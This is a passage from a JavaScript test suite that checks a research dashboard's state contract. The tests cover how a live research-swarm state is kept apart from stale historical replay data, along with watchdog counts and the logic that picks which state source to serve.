    assert(Array.isArray(evaluated[0].watchdog.flags), "the conclusion's watchdog field must expose flag labels");
  });
});

/* ============================================================================
 * 14. Phase 5A.1 — the dashboard state contract (researchSwarm vs historicalResearch)
 * ==========================================================================*/

test("65. A live Phase 5A research state reaches the dashboard state contract with every swarm field", async () => {
  await withTempRoot(async (root) => {
    await writeLivePlusStalePhase3Fixture(root, { swarm: liveSwarmFixture() });
    const { status, body } = await readDashboardState({ root, requested: "auto" });

    assertEqual(status, 200, "a live state must be served");
    assertEqual(body.stateContractVersion, DASHBOARD_STATE_CONTRACT_VERSION, "the contract must be versioned");
    assertEqual(body.stateSource, "live", "auto must serve the live document");

    const swarm = body.researchSwarm;
    assert(swarm, "the contract must expose a researchSwarm object");
    for (const field of [
      "enabled",
      "provider",
      "cycle",
      "regime",
      "proposalsGenerated",
      "proposalsAccepted",
      "proposalsRejected",
      "compiledFamilies",
      "injectedCandidates",
      "memoryRecords",
      "conclusions",
      "evaluations",
      "researcherRoles",
      "watchdog",
    ]) {
      assert(swarm[field] !== undefined, `the swarm state must expose ${field}`);
    }
    assertEqual(swarm.proposalsGenerated, 66, "the live proposal count must reach the dashboard");
    assertEqual(swarm.compiledFamilies, 33, "the live compiled-family count must reach the dashboard");
    assertEqual(swarm.memoryRecords, 46, "the live memory-record count must reach the dashboard");
    assertEqual(swarm.researcherRoles["execution-researcher"], 22, "researcher-role counts must reach the dashboard");

    // Watchdog NORMAL / WATCH / QUARANTINED counts, machine-readable.
    assertEqual(swarm.watchdog.normal, 6, "watchdog NORMAL count");
    assertEqual(swarm.watchdog.watch, 7, "watchdog WATCH count");
    assertEqual(swarm.watchdog.quarantined, 0, "watchdog QUARANTINED count");
    assertEqual(swarm.watchdog.evaluated, 13, "watchdog evaluated count");
    assert(typeof swarm.watchdog.lastEvaluatedAt === "string", "watchdog evaluation timestamp");
    assertEqual(swarm.source, "live", "the swarm summary must be labelled with its source document");
    assertNoNonFinite(swarm, "researchSwarm");
  });
});

test("66. A stale Phase 3 replay/experiment cannot be mistaken for, or overwrite, the current research swarm", async () => {
  await withTempRoot(async (root) => {
    const { staleExperimentId } = await writeLivePlusStalePhase3Fixture(root, { swarm: liveSwarmFixture() });
    const { status, body } = await readDashboardState({ root, requested: "auto" });

    assertEqual(status, 200, "the live state must be served");
    assertEqual(body.stateSource, "live", "a stale replay-state.json must never take the dashboard over from an existing live state");
    assertEqual(body.researchSwarm.cycle, 11, "the current swarm cycle must be the live one");
    assert(
      JSON.stringify(body.researchSwarm).includes("session-demo") === false,
      "the stale Phase 3 replay dataset must never appear inside the current swarm state",
    );

    // The Phase 3 information is not removed — it is exposed under a distinct,
    // explicitly historical field.
    const historical = body.historicalResearch;
    assert(historical, "historical research data must still be available");
    assertEqual(historical.kind, "historical", "historical data must be labelled as historical");
    assertEqual(historical.experiment.id, staleExperimentId, "the newest experiment report must still be exposed");
    assert(
      typeof historical.note === "string" && historical.note.includes("researchSwarm"),
      "the historical block must point the reader at the current swarm field",
    );

    // The two concepts are distinct objects: neither field contains the other's
    // identifying keys.
    assert(body.historicalResearch.experiment !== undefined, "historicalResearch carries the experiment");
    assertEqual(body.researchSwarm.proposalsGenerated, 66, "researchSwarm carries the swarm numbers");
    assertEqual(body.historicalResearch.memoryRecords, undefined, "historicalResearch must not carry swarm counters");
    assertEqual(body.researchSwarm.dataset, undefined, "researchSwarm must not carry replay dataset metadata");
  });
});

test("67. A replay document never blanks the swarm panel: the swarm summary still comes from the live state", async () => {
  await withTempRoot(async (root) => {
    await writeLivePlusStalePhase3Fixture(root, { swarm: liveSwarmFixture() });
    const { status, body } = await readDashboardState({ root, requested: "replay" });

    assertEqual(status, 200, "an explicitly requested replay must be served when the file exists");
    assertEqual(body.stateSource, "replay", "the requested source must be honored");
    assertEqual(body.historicalResearch.dataset.id, "session-demo", "the replay metadata must describe the replay document");
    assertEqual(body.researchSwarm.cycle, 11, "the research swarm summary must still be the live one");
    assertEqual(body.researchSwarm.source, "live", "the swarm summary must report that it came from the live document");
    assert(body.researchSwarm.sourceUpdatedAt !== undefined, "the swarm summary must carry provenance");
  });
});

test("68. Source selection: live wins whenever it exists (even stale); replay is only a last resort", () => {
  const stale = 4_000_000;
  assertEqual(
    selectStateSource({ requested: "auto", live: { exists: true, mtimeMs: 1 }, replay: { exists: true, mtimeMs: stale } }),
    "live",
    "auto must prefer the live document over a replay document",
  );
  assertEqual(selectStateSource({ requested: "auto", live: { exists: false }, replay: { exists: true } }), "replay", "auto falls back to replay only when live is absent");
  assertEqual(selectStateSource({ requested: "auto", live: { exists: false }, replay: { exists: false } }), null, "nothing to serve");
  assertEqual(selectStateSource({ requested: "live", live: { exists: false }, replay: { exists: true } }), null, "an explicit live request must not silently serve a replay");
  assertEqual(selectStateSource({ requested: "replay", live: { exists: true }, replay: { exists: false } }), null, "an explicit replay request must not silently serve live state");
  assertEqual(selectStateSource({ requested: "AUTO", live: { exists: true }, replay: { exists: false } }), "live", "source names are case-insensitive");

  // buildResearchState never merges the two concepts, whatever the documents say.
  const merged = buildResearchState({
    document: { researchSwarm: { cycle: 3 }, research: { mode: "replay", dataset: { id: "session-demo" } } },
    source: "replay",
    liveDocument: { researchSwarm: { cycle: 9 } },
    historical: { experiment: { id: "exp-session-demo" } },
    swarmUpdatedAt: "2026-09-17T20:00:00.000Z",
  });
  assertEqual(merged.researchSwarm.cycle, 3, "a replay document's own swarm summary wins when it has one");
  assertEqual(merged.researchSwarm.dataset, undefined, "the replay metadata must never leak into the swarm object");
  assertEqual(merged.historicalResearch.dataset.id, "session-demo", "replay metadata belongs to the historical object");
  assertEqual(merged.historicalResearch.experiment.id, "exp-session-demo", "historical reference data is preserved");
});

/* ============================================================================
 * Runner
 * ==========================================================================*/

async function run() {
  let passed = 0;
  const failures = [];

  for (const testCase of cases) {
    const start = Date.now();
    try {
      await testCase.fn();
      passed += 1;
      console.log(`  ✓ ${testCase.name} (${Date.now() - start}ms)`);
    } catch (error) {
      failures.push({ name: testCase.name, error });
      console.log(`  ✗ ${testCase.name}`);
      console.log(`      ${error?.message ?? error}`);
    }
  }

  console.log(`\nEVOLVE Phase 5A validation: ${passed}/${cases.length} checks passed`);

  if (failures.length > 0) {
    console.log("Failed checks:");
    for (const failure of failures) console.log(`  - ${failure.name}`);
    process.exitCode = 1;
  } else {
    console.log("All Phase 5A checks passed.");
    console.log("PAPER RESEARCH ONLY. Nothing here is a profitability claim, and zero Deployment Candidates remains an acceptable outcome.");
  }
}

run().catch((error) => {
  console.error("phase 5a validation runner crashed:", error);
  process.exitCode = 1;
});
